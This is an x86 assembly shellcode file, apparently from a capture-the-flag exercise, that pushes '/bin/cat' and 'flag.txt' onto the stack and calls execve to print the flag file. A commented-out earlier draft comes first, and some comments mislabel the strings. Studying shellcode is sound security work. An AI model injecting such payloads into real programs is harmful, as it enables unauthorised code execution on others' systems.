.intel_syntax noprefix   # Intel syntax with no prefix for registers or instructions.

.section .text           # Text section: where executable code resides.
.global _start           # Define the _start symbol as the entry point for the code.

# _start:
#     xor    eax,eax     # set eax to 0
#     push   eax         # end of string
#     push   0x7461632f  #"tac/"
#     push   0x6e69622f  #"inb/"
#     mov    ebx,esp
#     push   eax         # end of string

#     push 0x67616c66
#     push 0x7478742e

#     mov    ecx,esp
#     push   eax  # null
#     push   ecx  # file
#     push   ebx  # /bin/cat
#     mov    ecx,esp # {/bin/cat,file,null}
#     xor eax,eax
#     add eax,0xb
#     int 0x80

# char *args[] = {"/bin/cat", "flagtxt", NULL}
#   execve("/bin/cat", args, NULL)
_start:
    xor eax, eax                       # Clear EAX (set it to 0)
    
    # Push "/bin/cat" onto the stack (including the null terminator)
    push eax                           # NULL terminator for "/bin/cat"
    push 0x7461632f                    # "cat/"
    push 0x6e69622f                    # "bin/"
    mov ebx, esp                       # Store pointer to "/bin/cat"
    
    # Push "flagtxt" onto the stack (including the null terminator)
    push eax                           # NULL terminator for "flagtxt"
    push 0x7478742e                    # "txt"
    push 0x67616c66                    # "flag"
    mov ecx, esp                       # Store pointer to "flagtxt"
    
    # Now set up argv array (pointers to "/bin/cat" and "flagtxt", followed by NULL)
    push eax                           # NULL for argv[2]
    push ecx                           # Pointer to "flagtxt" (argv[1])
    push ebx                           # Pointer to "/bin/cat" (argv[0])
    
    # ECX now points to the argv array: {"/bin/cat", "flagtxt", NULL}
    mov ecx, esp                       # ECX = argv
    
    xor edx, edx                       # EDX = envp = NULL (no environment variables)
    
    # EBX should point to the filename ("/bin/cat")
    mov ebx, [ecx]                     # EBX = "/bin/cat"
    
    # Perform the execve system call
    mov al, 0xb                       # execve syscall number (11)
    int 0x80                           # Trigger the syscall
    
    # Exit the program (in case execve fails)
    mov al, 0x1                         # Exit system call number (1)
    xor ebx, ebx                       # Exit status 0
    int 0x80                           # Trigger the exit syscall
